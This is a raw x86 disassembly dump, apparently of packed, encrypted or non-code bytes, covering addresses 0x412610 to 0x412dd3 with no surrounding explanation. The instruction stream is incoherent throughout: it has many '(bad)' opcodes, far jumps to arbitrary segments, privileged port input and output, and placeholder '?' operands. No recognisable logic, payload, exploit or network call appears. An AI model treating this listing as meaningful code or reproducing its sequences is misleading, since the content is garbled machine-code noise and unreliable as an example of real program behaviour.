  412610:	mov    cl,0xa8
  412612:	ja     0x41267b
  412614:	cli    
  412615:	jbe    0x41267f
  412617:	int    0x13
  412619:	push   edx
  41261a:	and    cl,bh
  41261c:	dec    esi
  41261d:	xchg   ebp,eax
  41261e:	jne    0x572358a3
  412624:	shl    BYTE PTR [esi],1
  412626:	sub    DWORD PTR [edi-0x54],ecx
  412629:	in     al,dx
  41262a:	call   0x986b922a
  41262f:	ss jno 0x4125d3
  412632:	push   0x23f49cdd
  412637:	mov    bl,0xb5
  412639:	sbb    ebp,esi
  41263b:	(bad)  
  41263c:	mov    dh,0xfb
  41263e:	dec    esp
  41263f:	push   0x4b
  412641:	cwde   
  412642:	adc    DWORD PTR ds:0x834bac0e,eax
  412648:	fimul  WORD PTR [eax-0x3e]
  41264b:	inc    esi
  41264c:	int3   
  41264d:	callw  0x51b0
  412651:	pop    DWORD PTR [edx+0x6b10e80c]
  412657:	push   0x73
  412659:	or     DWORD PTR [edi],esp
  41265b:	lea    eax,[esi+edx*4+0x40]
  41265f:	loopne 0x412671
  412661:	les    ecx,FWORD PTR [esi-0x60]
  412664:	or     bl,bl
  412666:	push   ebp
  412667:	dec    ebx
  412668:	and    DWORD PTR [edi+0x7c],ebp
  41266b:	sub    DWORD PTR [edx+0x2c],0xffffffb6
  41266f:	pop    edi
  412670:	repz xchg ebp,eax
  412672:	cmp    eax,0x715bac18
  412677:	stos   DWORD PTR es:[edi],eax
  412678:	push   esi
  412679:	in     eax,0x2e
  41267b:	mov    ds:0x6e9751c,al
  412680:	(bad)  
  412681:	add    eax,0x8e6e6f13
  412686:	test   BYTE PTR [ecx+0x435d67a7],bl
  41268c:	inc    esi
  41268d:	or     cl,BYTE PTR [ebp+0x70699bde]
  412693:	and    eax,0x7f0c9014
  412698:	dec    edi
  412699:	xor    DWORD PTR [edx+0x6401c31c],0x44cd956e
  4126a3:	(bad)  
  4126a4:	mov    bh,0x7e
  4126a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126a7:	xchg   ebx,eax
  4126a8:	pop    esp
  4126a9:	lods   al,BYTE PTR ds:[esi]
  4126aa:	fisub  DWORD PTR [ecx]
  4126ac:	add    eax,0xe821f94b
  4126b1:	pop    ebp
  4126b2:	fidiv  WORD PTR [esi]
  4126b4:	mov    BYTE PTR [ecx],dl
  4126b6:	ins    DWORD PTR es:[edi],dx
  4126b7:	pop    ss
  4126b8:	xor    dh,bh
  4126ba:	es jl  0x4126a9
  4126bd:	jbe    0x4126cc
  4126bf:	sub    DWORD PTR [ecx],eax
  4126c1:	loop   0x412682
  4126c3:	aad    0x1
  4126c5:	dec    eax
  4126c6:	pop    eax
  4126c7:	mov    ebx,0xe99b1435
  4126cc:	(bad)  
  4126cd:	or     BYTE PTR [ebx+0x2ea84d7f],dl
  4126d3:	jo     0x4126f4
  4126d5:	mov    WORD PTR [edx-0x1c5a3428],gs
  4126db:	sub    esi,DWORD PTR [ebp-0x7ca0b251]
  4126e1:	into   
  4126e2:	add    eax,0x2e386dad
  4126e7:	inc    esi
  4126e8:	mov    gs,WORD PTR [ecx+0x535dacf9]
  4126ee:	pop    ebp
  4126ef:	xchg   ebp,eax
  4126f0:	loope  0x412734
  4126f2:	out    dx,eax
  4126f3:	xlat   BYTE PTR ds:[ebx]
  4126f4:	leave  
  4126f5:	push   gs
  4126f7:	add    DWORD PTR [edi],edi
  4126f9:	mov    ah,0xa5
  4126fb:	mov    ah,0xdd
  4126fd:	add    ebp,esi
  4126ff:	cmp    BYTE PTR [eax-0x5a],cl
  412702:	push   esp
  412703:	(bad)  [edi+0x320d55d5]
  412709:	jne    0x4126b6
  41270b:	xchg   edx,eax
  41270c:	test   BYTE PTR [eax+ecx*1],ah
  41270f:	ins    BYTE PTR es:[edi],dx
  412710:	arpl   WORD PTR [esp+ebx*2+0x10],si
  412714:	outs   dx,DWORD PTR ds:[esi]
  412715:	pop    ds
  412716:	out    dx,eax
  412717:	xchg   ebp,eax
  412718:	add    BYTE PTR [ebp-0x30],ah
  41271b:	sub    esi,DWORD PTR [ecx-0x29711166]
  412721:	mov    edi,0xfaedb49e
  412726:	retf   0xb162
  412729:	lds    eax,FWORD PTR [eax+0x3b]
  41272c:	and    DWORD PTR [ebx+esi*8-0x6e],edx
  412730:	aas    
  412731:	mov    BYTE PTR [ebp-0x1b],dh
  412734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412735:	nop
  412736:	jae    0x41273c
  412738:	mov    ds:0x8ae42807,al
  41273d:	ror    BYTE PTR [ebx+0x1829a8c2],1
  412743:	jmp    FWORD PTR [esp+esi*2]
  412746:	nop
  412747:	outs   dx,DWORD PTR ds:[esi]
  412748:	call   0x71a53f05
  41274d:	jmp    0x921a:0xb4e099ae
  412754:	dec    edi
  412755:	fadd   st,st(4)
  412757:	xlat   BYTE PTR ds:[ebx]
  412758:	rcl    DWORD PTR [esi],0x9e
  41275b:	dec    esp
  41275c:	aaa    
  41275d:	xchg   ecx,eax
  41275e:	mov    esi,0xa7a66346
  412763:	lods   eax,DWORD PTR ds:[esi]
  412764:	sar    al,0x16
  412767:	jge    0x412743
  412769:	jge    0x412751
  41276b:	push   0x9fbc7e43
  412770:	(bad)  
  412771:	into   
  412772:	or     ebp,0xc9d858ae
  412778:	jns    0x4127d2
  41277a:	adc    eax,0xf967456d
  41277f:	push   edx
  412780:	sub    BYTE PTR [edx+0x34],cl
  412783:	jle    0x412712
  412785:	js     0x41276f
  412787:	xor    DWORD PTR [ebx-0x58],0x6caa890a
  41278e:	arpl   ax,si
  412790:	cmp    al,0x1c
  412792:	(bad)  
  412794:	jns    0x41272a
  412796:	adc    eax,DWORD PTR [edi-0x51]
  412799:	mov    BYTE PTR [ebp+0x6e],ch
  41279c:	xchg   esp,eax
  41279d:	rcr    DWORD PTR [eax+0x3a549569],1
  4127a3:	sub    BYTE PTR [eax+0x29],cl
  4127a6:	rcl    BYTE PTR [edi],cl
  4127a8:	aam    0x92
  4127aa:	mov    ah,BYTE PTR [eax]
  4127ac:	jmp    0x4127c6
  4127ae:	popf   
  4127af:	fs (bad) 
  4127b1:	jo     0x412830
  4127b3:	ds nop
  4127b5:	mov    bl,0x5d
  4127b7:	inc    ecx
  4127b8:	xor    eax,0x8ce42ca6
  4127bd:	cmp    al,0x71
  4127bf:	fcomip st,st(1)
  4127c1:	in     eax,dx
  4127c2:	in     al,0xac
  4127c4:	outs   dx,DWORD PTR ds:[esi]
  4127c5:	mov    dh,0xdc
  4127c7:	jo     0x4127ed
  4127c9:	mov    ah,0x7f
  4127cb:	dec    ecx
  4127cc:	add    BYTE PTR [eax+edx*4-0x2a],al
  4127d0:	hlt    
  4127d1:	and    DWORD PTR [esi],0x3f
  4127d4:	repnz mov ecx,DWORD PTR [edx-0x3a20ef4a]
  4127db:	dec    esp
  4127dc:	add    al,0xf3
  4127de:	cdq    
  4127df:	xlat   BYTE PTR ds:[ebx]
  4127e0:	mov    al,ds:0xea03774f
  4127e5:	mov    edi,0x4f41e9d4
  4127ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127eb:	pop    ecx
  4127ec:	out    0xeb,al
  4127ee:	jb     0x4127ce
  4127f0:	xchg   ebx,eax
  4127f1:	xchg   BYTE PTR [edi],ah
  4127f3:	xor    cl,BYTE PTR [esi+0x69]
  4127f6:	mov    bl,BYTE PTR [ecx-0x10]
  4127f9:	jecxz  0x4127c9
  4127fb:	popf   
  4127fc:	mov    ch,0xd5
  4127fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ff:	(bad)  
  412800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412801:	and    dh,0x1f
  412804:	pop    es
  412805:	aaa    
  412806:	dec    edi
  412807:	jg     0x4127f2
  412809:	or     esp,DWORD PTR [edi-0x48]
  41280c:	std    
  41280d:	fadd   DWORD PTR [esi-0x4f]
  412810:	in     al,0x7
  412812:	clc    
  412813:	adc    al,0x68
  412815:	push   esp
  412816:	sbb    dl,dh
  412818:	mov    dl,0x8f
  41281a:	cmp    BYTE PTR [ebp+0x4d22d9eb],dl
  412820:	dec    ebp
  412821:	cwde   
  412822:	cmp    dh,cl
  412824:	lods   eax,DWORD PTR ds:[esi]
  412825:	shr    BYTE PTR ds:0xf7142ba,1
  41282b:	popf   
  41282c:	es repz mov edx,0xe2d5210a
  412833:	or     bl,cl
  412835:	fst    QWORD PTR [esi]
  412837:	popf   
  412838:	and    dl,al
  41283a:	stc    
  41283b:	outs   dx,DWORD PTR ds:[esi]
  41283c:	stc    
  41283d:	clc    
  41283e:	mov    ds:0xba35663f,eax
  412843:	cmc    
  412844:	push   ss
  412845:	adc    al,0x3a
  412847:	outs   dx,DWORD PTR ds:[esi]
  412848:	popf   
  412849:	mov    ch,0x8a
  41284b:	std    
  41284c:	xchg   dl,bh
  41284e:	mov    bl,0x6d
  412850:	pop    ebx
  412851:	lea    esp,[edx-0x35]
  412854:	imul   edi,DWORD PTR ds:0x744654d4,0xfde7c6ad
  41285e:	mov    dl,0xf0
  412860:	(bad)  
  412861:	xlat   BYTE PTR ds:[ebx]
  412862:	adc    ecx,ebp
  412864:	push   es
  412865:	xchg   edx,eax
  412866:	cmp    BYTE PTR [eax-0x1e],cl
  412869:	mov    ebp,DWORD PTR ds:0xfc3b14b0
  41286f:	(bad)  
  412870:	xor    DWORD PTR [edx+0x203f8b28],esi
  412876:	test   BYTE PTR [edi-0x742ddb8a],dl
  41287c:	rcl    DWORD PTR [ebp-0x21fb78a0],1
  412882:	mov    ch,BYTE PTR [ebx+0x4a04446e]
  412888:	pop    eax
  412889:	mov    esp,0x557f0238
  41288e:	ja     0x4128e6
  412890:	mov    ch,0x1
  412892:	pop    esp
  412893:	pop    ecx
  412894:	and    DWORD PTR [ebx],ebx
  412896:	repnz test eax,0x57fb044d
  41289c:	and    eax,0xeb44e85d
  4128a1:	or     ah,cl
  4128a3:	jle    0x412839
  4128a5:	out    0xe2,eax
  4128a7:	mov    edi,0x81611771
  4128ac:	or     al,0xa8
  4128ae:	cdq    
  4128af:	mov    esi,0x5b7628b0
  4128b4:	inc    ebp
  4128b5:	sbb    esi,esi
  4128b7:	and    edi,DWORD PTR [esi-0x686b6064]
  4128bd:	pop    ecx
  4128be:	popa   
  4128bf:	xchg   ebx,eax
  4128c0:	clc    
  4128c1:	aad    0xd4
  4128c3:	or     ah,BYTE PTR [edi]
  4128c5:	dec    edx
  4128c6:	daa    
  4128c7:	mov    bl,0xda
  4128c9:	cmp    al,0x7
  4128cb:	or     ch,cl
  4128cd:	daa    
  4128ce:	xor    edx,DWORD PTR [edx+esi*2]
  4128d1:	nop
  4128d2:	sbb    ch,bh
  4128d4:	mov    bh,0x13
  4128d6:	add    BYTE PTR [ebp+0x37],ah
  4128d9:	enter  0xb760,0xfa
  4128dd:	pop    edx
  4128de:	mov    ebp,0xccde98a4
  4128e3:	xchg   ebp,eax
  4128e4:	add    DWORD PTR fs:[edx+0x78924455],esp
  4128eb:	sbb    bl,ah
  4128ed:	or     BYTE PTR [edi-0x1acd65d3],0xb0
  4128f4:	jmp    0xfd4f:0x1551751
  4128fb:	jle    0x41295c
  4128fd:	jge    0x412927
  4128ff:	(bad)  
  412900:	jge    0x4128ea
  412902:	jge    0x412939
  412904:	imul   edx,ecx,0x354e56b
  41290a:	add    al,0xd4
  41290c:	sub    eax,0xa8a16687
  412911:	xor    dl,dl
  412913:	ins    DWORD PTR es:[edi],dx
  412914:	jp     0x4128ab
  412916:	inc    ebx
  412917:	jmp    0xe3b9:0x6a333f46
  41291e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291f:	aam    0x4c
  412921:	push   0xffffff86
  412923:	or     DWORD PTR ds:0x59e0e0a2,0x29
  41292a:	xor    DWORD PTR [eax+0x7f],eax
  41292d:	js     0x4128bd
  41292f:	into   
  412930:	sar    DWORD PTR [esi+esi*8+0x19],1
  412934:	or     eax,0x2b6a74a7
  412939:	jnp    0x412981
  41293b:	jae    0x412982
  41293d:	stos   BYTE PTR es:[edi],al
  41293e:	clc    
  41293f:	push   edi
  412940:	addr16 mov bh,0xa4
  412943:	jp     0x412990
  412945:	lods   eax,DWORD PTR ds:[esi]
  412946:	outs   dx,BYTE PTR ds:[esi]
  412947:	dec    edi
  412948:	arpl   WORD PTR [eax+0x4c],dx
  41294b:	or     DWORD PTR [eax+eiz*4+0x56],esi
  41294f:	push   ecx
  412950:	push   cs
  412951:	push   es
  412952:	push   0x56078085
  412957:	iret   
  412958:	mov    ds:0x49fad973,al
  41295d:	fld    TBYTE PTR [eax+ecx*1]
  412960:	popa   
  412961:	(bad)  
  412962:	push   0x27
  412964:	xchg   sp,ax
  412966:	dec    edx
  412967:	sbb    al,0xfb
  412969:	ss push ds
  41296b:	mov    ebp,0x2a9480c7
  412970:	loop   0x4128f4
  412972:	ret    
  412973:	xchg   esi,eax
  412974:	fidiv  WORD PTR [edx+0x0]
  412977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412978:	icebp  
  412979:	test   DWORD PTR [edx-0x57050534],edi
  41297f:	jnp    0x412957
  412981:	cmp    eax,0x96f7c987
  412986:	daa    
  412987:	stos   BYTE PTR es:[edi],al
  412988:	xchg   esi,eax
  412989:	icebp  
  41298a:	les    esp,FWORD PTR ds:0x51a939d4
  412990:	fdivr  st,st(4)
  412992:	shl    BYTE PTR [ebp+0x40863f90],cl
  412998:	lds    eax,FWORD PTR [ebx-0x2961dace]
  41299e:	add    dl,BYTE PTR [ebx+edx*4+0x79]
  4129a2:	sbb    eax,0x7650145
  4129a7:	cwde   
  4129a8:	call   0xc3f05a7d
  4129ad:	push   0x1b46ec69
  4129b2:	arpl   WORD PTR ds:0x94fd2d5,ax
  4129b8:	fcomp  DWORD PTR [edi+0x30]
  4129bb:	jg     0x412943
  4129bd:	mov    ds:0xda05c9f8,eax
  4129c2:	pop    ebx
  4129c3:	pushf  
  4129c4:	jl     0x412a03
  4129c6:	cmp    ecx,DWORD PTR [ecx+0x14]
  4129c9:	jecxz  0x412a27
  4129cb:	js     0x41294d
  4129cd:	and    ebx,DWORD PTR [ecx]
  4129cf:	sub    al,0x5
  4129d1:	jnp    0x412a30
  4129d3:	ficom  WORD PTR [ebp+0x20]
  4129d6:	sahf   
  4129d7:	leave  
  4129d8:	jecxz  0x41297b
  4129da:	pop    es
  4129db:	mov    ebx,0xcfc5eee3
  4129e0:	cwde   
  4129e1:	daa    
  4129e2:	jmp    0x7e5f0ab6
  4129e7:	xchg   esi,eax
  4129e8:	cmp    ebx,DWORD PTR [eax-0x32]
  4129eb:	jmp    0x8b81b066
  4129f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f1:	sbb    BYTE PTR [esi+0x4fde9a72],bh
  4129f7:	pop    ds
  4129f8:	pop    ds
  4129f9:	adc    ebx,ebp
  4129fb:	mov    DWORD PTR [esi+0x5f],ecx
  4129fe:	mov    eax,0x86639c43
  412a03:	lea    edx,[ebx+eax*2-0x41]
  412a07:	dec    esp
  412a08:	ins    DWORD PTR es:[edi],dx
  412a09:	mov    cl,0x33
  412a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a0c:	sbb    esi,DWORD PTR [esi]
  412a0e:	int3   
  412a0f:	bound  ecx,QWORD PTR [edi-0x63e2a31e]
  412a15:	mov    al,0xb2
  412a17:	xchg   esi,eax
  412a18:	xchg   ebp,eax
  412a19:	dec    esi
  412a1a:	mov    ebx,0xcc6314f4
  412a1f:	mov    ebx,0x33160887
  412a24:	fdivp  st(2),st
  412a26:	pop    ss
  412a27:	hlt    
  412a28:	les    ecx,FWORD PTR [ebx+0x5275608]
  412a2e:	iret   
  412a2f:	dec    ecx
  412a30:	mov    al,ds:0xe0ccae15
  412a35:	jle    0x412aa8
  412a37:	adc    ebp,DWORD PTR [ecx+0x152f12f]
  412a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3e:	popa   
  412a3f:	pushf  
  412a40:	cmp    DWORD PTR [bp+di],esp
  412a43:	mov    edx,0xfa0fc42
  412a48:	mov    dh,BYTE PTR [ecx+0x688ddc01]
  412a4e:	je     0x412a24
  412a50:	test   eax,0x2ab27e71
  412a55:	sti    
  412a56:	bound  esi,QWORD PTR [ebp-0x488394ae]
  412a5c:	pop    ss
  412a5d:	xchg   edi,eax
  412a5e:	mov    ds,WORD PTR [ebx+0x8045c5c]
  412a64:	inc    edi
  412a65:	mov    eax,0xd349dc27
  412a6a:	clc    
  412a6b:	pop    ss
  412a6c:	push   ds
  412a6d:	push   ss
  412a6e:	lock add ch,BYTE PTR [ecx]
  412a71:	add    DWORD PTR [edi-0x51c1320f],esi
  412a77:	test   DWORD PTR [ebx-0x48],esi
  412a7a:	scas   eax,DWORD PTR es:[edi]
  412a7b:	inc    esp
  412a7c:	rcl    dl,cl
  412a7e:	xchg   esp,eax
  412a7f:	in     eax,dx
  412a80:	je     0x412a4c
  412a82:	cmc    
  412a83:	popf   
  412a84:	mov    ?,WORD PTR [edi]
  412a86:	sub    DWORD PTR [eax],edx
  412a88:	cmp    edx,eax
  412a8a:	mov    ah,0xdb
  412a8c:	mov    ah,0x37
  412a8e:	into   
  412a8f:	add    al,0x6b
  412a91:	inc    edi
  412a92:	or     bl,ah
  412a94:	and    eax,0x1c5bfb57
  412a99:	in     eax,0x5a
  412a9b:	xor    edx,0xa7b481d9
  412aa1:	mov    ds:0x2ded7152,al
  412aa6:	clc    
  412aa7:	xchg   ecx,eax
  412aa8:	or     eax,0xf0247bc2
  412aad:	pop    edi
  412aae:	mov    edi,0x7f8eaee0
  412ab3:	pop    esi
  412ab4:	jnp    0x412a76
  412ab6:	ins    DWORD PTR es:[edi],dx
  412ab7:	push   ecx
  412ab8:	sti    
  412ab9:	sub    edi,DWORD PTR [edx+0x3a3380ec]
  412abf:	xchg   DWORD PTR [ebx],edi
  412ac1:	xchg   edx,eax
  412ac2:	fist   DWORD PTR [esi+0xe]
  412ac5:	jo     0x412b1e
  412ac7:	aam    0x46
  412ac9:	add    al,0x24
  412acb:	cmp    BYTE PTR [esi+0x78fd299b],0xcb
  412ad2:	inc    esp
  412ad3:	and    eax,0xead3ed9d
  412ad8:	idiv   DWORD PTR [eax+0x38]
  412adb:	arpl   WORD PTR ds:0x7631e475,ax
  412ae1:	sar    cl,1
  412ae3:	outs   dx,DWORD PTR ds:[esi]
  412ae4:	jbe    0x412afb
  412ae6:	sub    edi,DWORD PTR [edi+esi*4]
  412ae9:	mov    eax,0xe9aea386
  412aee:	xor    al,0xbc
  412af0:	iret   
  412af1:	hlt    
  412af2:	gs cli 
  412af4:	mov    ecx,0xcb6c7cda
  412af9:	repz lea ecx,[ebp+0x12]
  412afd:	fdivr  DWORD PTR [edi-0x4e0d79e]
  412b03:	inc    edi
  412b04:	pop    edx
  412b05:	jo     0x412af1
  412b07:	sbb    edi,esp
  412b09:	outs   dx,DWORD PTR ds:[esi]
  412b0a:	aaa    
  412b0b:	lahf   
  412b0c:	sbb    eax,0xc180330b
  412b11:	sub    edi,DWORD PTR [ecx]
  412b13:	sbb    al,0x86
  412b15:	(bad)  
  412b16:	call   0xb2be8d3d
  412b1b:	mov    WORD PTR [ebx+0x3f],fs
  412b1e:	daa    
  412b1f:	retf   
  412b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b21:	fnstcw WORD PTR [esi+0xc]
  412b24:	mov    ds,WORD PTR [esi]
  412b26:	push   edi
  412b27:	nop
  412b28:	cmp    al,0x5e
  412b2a:	add    cl,BYTE PTR [ebp+0x25]
  412b2d:	sbb    ebp,ecx
  412b2f:	xor    ebx,DWORD PTR [ecx-0x30]
  412b32:	mov    dh,0x8b
  412b34:	add    DWORD PTR [eax-0x1490f3af],ebp
  412b3a:	inc    ecx
  412b3b:	cmp    edi,DWORD PTR [ebp+0x50]
  412b3e:	popa   
  412b3f:	mov    ebp,0xbaa12ab
  412b44:	ins    DWORD PTR es:[edi],dx
  412b45:	call   0x40e77c9f
  412b4a:	sbb    BYTE PTR [ebp+0x4b54aea3],al
  412b50:	rol    ebx,cl
  412b52:	retf   0xce11
  412b55:	xchg   BYTE PTR [eax+0x2b970b1e],dl
  412b5b:	push   eax
  412b5c:	jae    0x412b25
  412b5e:	cmp    BYTE PTR [esi-0x1756245d],ah
  412b64:	or     BYTE PTR [edx-0x493b8c02],bh
  412b6a:	test   BYTE PTR [eax],0xeb
  412b6d:	dec    ebp
  412b6e:	pop    esp
  412b6f:	push   edx
  412b70:	xor    ecx,ebx
  412b72:	xor    bl,BYTE PTR [ecx]
  412b74:	mov    eax,ds:0xafbecfe9
  412b79:	mov    WORD PTR [ebp-0x32],ss
  412b7c:	sbb    al,0x84
  412b7e:	fimul  DWORD PTR [ecx]
  412b80:	cmp    al,0xba
  412b82:	shr    esp,0x60
  412b85:	retw   
  412b87:	dec    ecx
  412b88:	inc    ebx
  412b89:	push   esi
  412b8a:	je     0x412bf7
  412b8c:	aad    0xec
  412b8e:	jbe    0x412b26
  412b90:	call   0xe7a48e92
  412b95:	aas    
  412b96:	jb     0x412bfc
  412b98:	mov    edx,cs
  412b9a:	scas   al,BYTE PTR es:[edi]
  412b9b:	test   al,0xbe
  412b9d:	(bad)  
  412b9e:	fbstp  TBYTE PTR ds:0xdcbd59c8
  412ba4:	leave  
  412ba5:	movzx  ecx,si
  412ba8:	loopne 0x412bb2
  412baa:	pop    ss
  412bab:	fsubp  st(5),st
  412bad:	icebp  
  412bae:	and    eax,0x2612983b
  412bb3:	sbb    al,BYTE PTR [edx-0x80]
  412bb6:	mov    ah,0xd4
  412bb8:	push   eax
  412bb9:	js     0x412bc9
  412bbb:	and    eax,0x1e1c5a22
  412bc0:	(bad)  
  412bc2:	mov    ds:0xec082b06,al
  412bc7:	mov    ss,ecx
  412bc9:	pop    ss
  412bca:	ins    BYTE PTR es:[edi],dx
  412bcb:	push   esi
  412bcc:	jno    0x412be5
  412bce:	out    dx,eax
  412bcf:	pushf  
  412bd0:	mov    esi,0x2f9a94d
  412bd5:	push   ecx
  412bd6:	clc    
  412bd7:	jne    0x412b5c
  412bd9:	sub    BYTE PTR [edx+eax*4-0x31],ch
  412bdd:	or     dh,BYTE PTR [ecx-0x150872d6]
  412be3:	outs   dx,BYTE PTR ds:[esi]
  412be4:	and    edx,ebx
  412be6:	clc    
  412be7:	fisttp DWORD PTR [edi-0x1b]
  412bea:	pop    ss
  412beb:	daa    
  412bec:	cli    
  412bed:	dec    esp
  412bee:	add    BYTE PTR [edx+ecx*2+0x45],cl
  412bf2:	mov    ah,0x4a
  412bf4:	repnz dec ecx
  412bf6:	scas   al,BYTE PTR es:[edi]
  412bf7:	jg     0x412b7c
  412bf9:	xlat   BYTE PTR ds:[ebx]
  412bfa:	and    BYTE PTR [ebp+0x7e],ah
  412bfd:	jmp    0x412bfd
  412bff:	jne    0x412b99
  412c01:	mov    eax,ds:0x3ccc2fb7
  412c06:	fiadd  WORD PTR [ecx+0x6c]
  412c09:	imul   esp,DWORD PTR [ebx-0x60],0x9052f885
  412c10:	out    0x5c,al
  412c12:	xchg   esp,eax
  412c13:	fsub   DWORD PTR [esi+0x3c8b3206]
  412c19:	and    eax,esi
  412c1b:	add    bl,BYTE PTR ds:0xb2c9c634
  412c21:	inc    ecx
  412c22:	fild   WORD PTR [ecx+0x766fec17]
  412c28:	cwde   
  412c29:	jb     0x412bfb
  412c2b:	mov    eax,ds:0x5b139731
  412c30:	add    BYTE PTR [edi],bl
  412c32:	enter  0xa316,0xae
  412c36:	sub    al,0x73
  412c38:	push   eax
  412c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c3a:	mov    ebp,0x4929e5e9
  412c3f:	pop    ebp
  412c40:	mov    eax,0xa3d475cb
  412c45:	int    0x5f
  412c47:	or     eax,0xc686b015
  412c4c:	ret    0x6535
  412c4f:	out    0xc7,al
  412c51:	mov    esi,?
  412c53:	ja     0x412c7a
  412c55:	out    dx,al
  412c56:	mov    al,0xe6
  412c58:	sub    eax,0xdadcbe62
  412c5d:	cmp    eax,0xe2ae3bab
  412c62:	fwait
  412c63:	icebp  
  412c64:	repnz ds call 0xfd78:0x51a850ec
  412c6d:	je     0x412c89
  412c6f:	fwait
  412c70:	and    al,0xd6
  412c72:	dec    esi
  412c73:	hlt    
  412c74:	mov    ch,0x96
  412c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c77:	adc    eax,0x79b0bd77
  412c7c:	(bad)  
  412c7d:	mov    bl,0x5d
  412c7f:	gs retf 
  412c81:	sbb    DWORD PTR [esp+ebp*2],esi
  412c84:	or     eax,0xa99275dd
  412c89:	dec    edi
  412c8a:	jbe    0x412d07
  412c8c:	and    DWORD PTR [esp+eax*2],ebx
  412c8f:	push   ecx
  412c91:	or     ch,al
  412c93:	lahf   
  412c94:	sub    ah,dh
  412c96:	mov    dl,0xb4
  412c98:	pop    ebp
  412c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9a:	stos   DWORD PTR es:[edi],eax
  412c9b:	loop   0x412cb8
  412c9d:	fs mov bh,0x6d
  412ca0:	xor    DWORD PTR [edx],ecx
  412ca2:	aad    0xfd
  412ca4:	dec    esi
  412ca5:	and    bh,BYTE PTR [esi-0x628b44b5]
  412cab:	out    0x6a,eax
  412cad:	mov    bh,0x52
  412caf:	repz shl DWORD PTR [edi],cl
  412cb2:	jb     0x412c9a
  412cb4:	push   esi
  412cb5:	and    DWORD PTR [esi-0x174f5a34],eax
  412cbb:	push   ebx
  412cbc:	or     ah,BYTE PTR [edi-0x7c36e687]
  412cc2:	pop    ebx
  412cc3:	sar    esi,cl
  412cc5:	push   esp
  412cc6:	add    DWORD PTR [ebx],ecx
  412cc8:	jns    0x412d1e
  412cca:	cdq    
  412ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ccc:	in     eax,dx
  412ccd:	or     DWORD PTR [esi+0x6385176c],eax
  412cd3:	dec    edi
  412cd4:	jecxz  0x412d3e
  412cd6:	pop    ebx
  412cd7:	jb     0x412cf2
  412cd9:	sbb    eax,0x34b5e49c
  412cde:	(bad)  
  412cdf:	add    eax,0x38a48768
  412ce4:	out    0xa9,al
  412ce6:	sbb    esp,DWORD PTR [esi+0x0]
  412ce9:	ror    BYTE PTR [ebp-0x43],cl
  412cec:	mov    cl,0x29
  412cee:	dec    esi
  412cef:	fdivr  QWORD PTR [edi+esi*4-0x45]
  412cf3:	adc    edx,DWORD PTR [eax+0x73]
  412cf6:	std    
  412cf7:	addr16 (bad) 
  412cf9:	mov    ecx,0xe076363f
  412cfe:	mov    ds:0x62868509,eax
  412d03:	ja     0x412cff
  412d05:	iret   
  412d06:	das    
  412d07:	mov    DWORD PTR [edx],edi
  412d09:	int    0xfb
  412d0b:	pop    ebx
  412d0c:	push   ebx
  412d0d:	jmp    0x412caf
  412d0f:	xchg   ebx,eax
  412d10:	fbld   TBYTE PTR [esi-0x51]
  412d13:	ins    BYTE PTR es:[edi],dx
  412d14:	push   ebx
  412d15:	sub    edx,ebp
  412d17:	neg    BYTE PTR [esi]
  412d19:	je     0x412cd2
  412d1b:	repz rol DWORD PTR ds:[edx+0x7fa9a5fa],0x52
  412d24:	hlt    
  412d25:	(bad)  [edi+0x5c563526]
  412d2b:	imul   DWORD PTR [esi]
  412d2d:	(bad)  
  412d2e:	int3   
  412d2f:	stc    
  412d30:	mov    eax,0xf6fd6d7
  412d35:	imul   esp,DWORD PTR ds:0x10517634,0xee2ce50c
  412d3f:	mov    esi,0xbab406b1
  412d44:	mov    esi,0x2b6f5bae
  412d49:	stc    
  412d4a:	pop    ecx
  412d4b:	dec    esi
  412d4c:	lock aaa 
  412d4e:	(bad)  
  412d4f:	or     esi,edi
  412d51:	push   ecx
  412d52:	jmp    0xb9ce0d62
  412d57:	retf   0xc927
  412d5a:	imul   ebp,DWORD PTR [edx],0x6f6ee98c
  412d60:	and    DWORD PTR ds:0x5c4bd208,ecx
  412d66:	inc    ebp
  412d67:	icebp  
  412d68:	mov    ecx,0x12385a37
  412d6d:	inc    eax
  412d6e:	enter  0x358,0x86
  412d72:	(bad)  
  412d73:	xlat   BYTE PTR ds:[ebx]
  412d74:	mov    al,ds:0x28d482db
  412d79:	pop    esi
  412d7a:	push   eax
  412d7b:	pop    ebx
  412d7c:	nop
  412d7d:	push   0x57
  412d7f:	aam    0x29
  412d81:	loopne 0x412d54
  412d83:	retf   0x1a5d
  412d86:	jmp    0x412d57
  412d88:	mov    DWORD PTR [ebx-0x67366e53],esp
  412d8e:	addr16 jl 0x412d94
  412d91:	add    cl,ch
  412d93:	mov    dl,dh
  412d95:	pop    edi
  412d96:	mov    cl,BYTE PTR [esi-0x57]
  412d99:	rcl    DWORD PTR [edx+0x63a57e27],0x23
  412da0:	pop    ds
  412da1:	imul   ebp,DWORD PTR gs:[esi+0x60],0x722198d2
  412da9:	outs   dx,DWORD PTR ds:[esi]
  412daa:	mov    cl,0xdb
  412dac:	jbe    0x412df0
  412dae:	sti    
  412daf:	adc    al,0xf8
  412db1:	int    0xa5
  412db3:	cmc    
  412db4:	push   esi
  412db5:	ja     0x412d4e
  412db7:	dec    edi
  412db8:	push   edx
  412db9:	mov    edx,0xb7d26f36
  412dbe:	es pop esp
  412dc0:	out    dx,al
  412dc1:	sahf   
  412dc2:	xor    al,0x5
  412dc4:	cmp    DWORD PTR [ebx-0x2f],esp
  412dc7:	fild   WORD PTR [ebp-0x40]
  412dca:	into   
  412dcb:	pop    ss
  412dcc:	and    dh,BYTE PTR ds:[ebp-0x4cfe78b9]
  412dd3:	bound  ecx,QWORD PTR [ebp-0x11]
